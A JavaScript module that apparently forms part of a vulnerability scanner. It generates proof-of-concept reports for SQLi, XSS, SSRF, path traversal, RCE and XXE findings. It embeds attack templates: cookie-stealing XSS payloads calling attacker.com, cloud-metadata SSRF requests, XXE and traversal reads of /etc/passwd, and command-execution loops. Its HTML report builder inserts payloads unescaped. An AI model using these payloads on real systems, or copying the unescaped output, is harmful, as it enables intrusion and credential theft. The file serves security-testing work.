// Phase 3: PoC Generator - Create proof-of-concept evidence
class PoCGenerator {
  /**
   * Generate PoC for vulnerability
   */
  static generatePoC(vulnerability) {
    const { type, endpoint, parameter, payload, response } = vulnerability;

    let poc = {
      title: `Proof of Concept - ${type}`,
      vulnerability: type,
      target: endpoint.url,
      parameter: parameter.name,
      payload: payload.payload,
      steps: [],
      evidence: []
    };

    switch (type) {
      case 'SQLi':
        poc = this._generateSQLiPoC(poc, vulnerability);
        break;
      case 'XSS':
        poc = this._generateXSSPoC(poc, vulnerability);
        break;
      case 'SSRF':
        poc = this._generateSSRFPoC(poc, vulnerability);
        break;
      case 'PathTraversal':
        poc = this._generatePathTraversalPoC(poc, vulnerability);
        break;
      case 'RCE':
        poc = this._generateRCEPoC(poc, vulnerability);
        break;
      case 'XXE':
        poc = this._generateXXEPoC(poc, vulnerability);
        break;
      default:
        poc.steps.push('Send malicious payload to vulnerable parameter');
        poc.steps.push('Observe abnormal behavior in response');
    }

    poc.evidence.push({
      type: 'Request',
      content: this._generateRequest(endpoint, parameter, payload)
    });

    poc.evidence.push({
      type: 'Response',
      content: response.data.substring(0, 1000) || 'Response data'
    });

    return poc;
  }

  /**
   * Generate SQLi PoC
   */
  static _generateSQLiPoC(poc, vulnerability) {
    poc.steps = [
      '1. Send the following payload in the parameter:',
      `   ${vulnerability.payload.payload}`,
      '2. Observe SQL error or unexpected data in response',
      '3. Use UNION-based or time-based extraction to dump data'
    ];

    poc.codeSnippet = {
      curl: `curl "${vulnerability.endpoint.url}?${vulnerability.parameter.name}=${encodeURIComponent(vulnerability.payload.payload)}"`,
      python: `import requests\nurl = "${vulnerability.endpoint.url}"\npayload = {"${vulnerability.parameter.name}": "${vulnerability.payload.payload}"}\nr = requests.get(url, params=payload)\nprint(r.text)`,
      javascript: `fetch("${vulnerability.endpoint.url}?${vulnerability.parameter.name}=${encodeURIComponent(vulnerability.payload.payload)}")\n  .then(r => r.text())\n  .then(console.log)`
    };

    return poc;
  }

  /**
   * Generate XSS PoC
   */
  static _generateXSSPoC(poc, vulnerability) {
    poc.steps = [
      '1. Submit the following payload:',
      `   ${vulnerability.payload.payload}`,
      '2. The payload will execute in the browser context',
      '3. Session cookies and sensitive data can be stolen'
    ];

    poc.codeSnippet = {
      curl: `curl "${vulnerability.endpoint.url}?${vulnerability.parameter.name}=${encodeURIComponent(vulnerability.payload.payload)}"`,
      html: `<img src=x onerror="new Image().src='http://attacker.com/steal.php?c='+document.cookie">`,
      javascript: `// Steal cookies\nfetch('http://attacker.com/log?cookie=' + document.cookie)`
    };

    return poc;
  }

  /**
   * Generate SSRF PoC
   */
  static _generateSSRFPoC(poc, vulnerability) {
    poc.steps = [
      '1. Send SSRF payload to access internal services:',
      `   ${vulnerability.payload.payload}`,
      '2. Access internal IP ranges (192.168.x.x, 10.0.x.x)',
      '3. Query cloud metadata endpoints for credentials'
    ];

    poc.codeSnippet = {
      python: `import requests\nurl = "${vulnerability.endpoint.url}"\npayload = {"${vulnerability.parameter.name}": "http://169.254.169.254/latest/meta-data/"}\nr = requests.post(url, data=payload)\nprint(r.text)`,
      curl: `curl -X POST "${vulnerability.endpoint.url}" -d "${vulnerability.parameter.name}=${encodeURIComponent(vulnerability.payload.payload)}"`
    };

    return poc;
  }

  /**
   * Generate Path Traversal PoC
   */
  static _generatePathTraversalPoC(poc, vulnerability) {
    poc.steps = [
      '1. Use path traversal sequence:',
      `   ${vulnerability.payload.payload}`,
      '2. Read sensitive files like /etc/passwd or /windows/win.ini',
      '3. Access configuration files and source code'
    ];

    poc.codeSnippet = {
      bash: `curl "${vulnerability.endpoint.url}?${vulnerability.parameter.name}=${encodeURIComponent(vulnerability.payload.payload)}"`,
      python: `import requests\nfiles = ["../../etc/passwd", "../../windows/win.ini"]\nfor f in files:\n    r = requests.get("${vulnerability.endpoint.url}", params={"${vulnerability.parameter.name}": f})\n    print(r.text[:200])`
    };

    return poc;
  }

  /**
   * Generate RCE PoC
   */
  static _generateRCEPoC(poc, vulnerability) {
    poc.steps = [
      '1. Execute system command:',
      `   ${vulnerability.payload.payload}`,
      '2. This allows full system compromise',
      '3. Attacker can read files, modify data, or further compromise'
    ];

    poc.codeSnippet = {
      bash: `curl "${vulnerability.endpoint.url}?${vulnerability.parameter.name}=${encodeURIComponent(vulnerability.payload.payload)}"`,
      python: `import requests\ncommands = ["id", "whoami", "cat /etc/passwd"]\nfor cmd in commands:\n    r = requests.get("${vulnerability.endpoint.url}", params={"${vulnerability.parameter.name}": cmd})\n    print(f"{cmd}: {r.text[:100]}")`
    };

    return poc;
  }

  /**
   * Generate XXE PoC
   */
  static _generateXXEPoC(poc, vulnerability) {
    poc.steps = [
      '1. Send XXE payload:',
      `   ${vulnerability.payload.payload}`,
      '2. Read local files or perform SSRF attacks',
      '3. Access cloud metadata or internal services'
    ];

    poc.codeSnippet = {
      xml: `<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<data>&xxe;</data>`,
      python: `import requests\npayload = '''<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<data>&xxe;</data>'''\nr = requests.post("${vulnerability.endpoint.url}", data=payload, headers={"Content-Type": "application/xml"})\nprint(r.text)`
    };

    return poc;
  }

  /**
   * Generate HTTP request
   */
  static _generateRequest(endpoint, parameter, payload) {
    const url = new URL(endpoint.url);
    const method = endpoint.method || 'GET';

    if (method === 'GET') {
      url.searchParams.set(parameter.name, payload.payload);
      return `GET ${url.pathname}${url.search} HTTP/1.1\nHost: ${url.hostname}\nUser-Agent: Mozilla/5.0\n\n`;
    } else {
      const body = `${parameter.name}=${encodeURIComponent(payload.payload)}`;
      return `POST ${url.pathname} HTTP/1.1\nHost: ${url.hostname}\nContent-Type: application/x-www-form-urlencoded\nContent-Length: ${body.length}\n\n${body}`;
    }
  }

  /**
   * Generate HTML PoC page
   */
  static generateHTMLPoC(vulnerabilities) {
    let html = `<!DOCTYPE html>
<html>
<head>
    <title>ZerOn - Proof of Concept</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
        .poc { background: white; padding: 20px; margin: 10px 0; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .critical { border-left: 4px solid #d32f2f; }
        .high { border-left: 4px solid #f57c00; }
        .medium { border-left: 4px solid #fbc02d; }
        .code { background: #f5f5f5; padding: 10px; overflow-x: auto; font-family: monospace; margin: 10px 0; }
        h1 { color: #333; }
        .step { margin: 10px 0; }
    </style>
</head>
<body>
    <h1>ZerOn - Vulnerability Proof of Concepts</h1>
    <p>Report generated on ${new Date().toLocaleString()}</p>
`;

    vulnerabilities.forEach((vuln, index) => {
      const poc = vuln.poc || {};
      const severity = vuln.severity || 'MEDIUM';
      
      html += `
    <div class="poc ${severity.toLowerCase()}">
        <h2>PoC #${index + 1}: ${poc.vulnerability || 'Unknown'}</h2>
        <p><strong>Target:</strong> ${poc.target}</p>
        <p><strong>Parameter:</strong> ${poc.parameter}</p>
        <p><strong>Severity:</strong> <span style="color: ${this._getSeverityColor(severity)}">${severity}</span></p>
        <h3>Steps to Reproduce:</h3>
        <ol>
            ${poc.steps.map(step => `<li>${step}</li>`).join('')}
        </ol>
        <h3>Request Example:</h3>
        <div class="code">${poc.codeSnippet?.curl || 'N/A'}</div>
    </div>
`;
    });

    html += `
</body>
</html>`;

    return html;
  }

  static _getSeverityColor(severity) {
    const colors = { CRITICAL: '#d32f2f', HIGH: '#f57c00', MEDIUM: '#fbc02d', LOW: '#689f38', INFO: '#1976d2' };
    return colors[severity] || '#757575';
  }
}

module.exports = PoCGenerator;
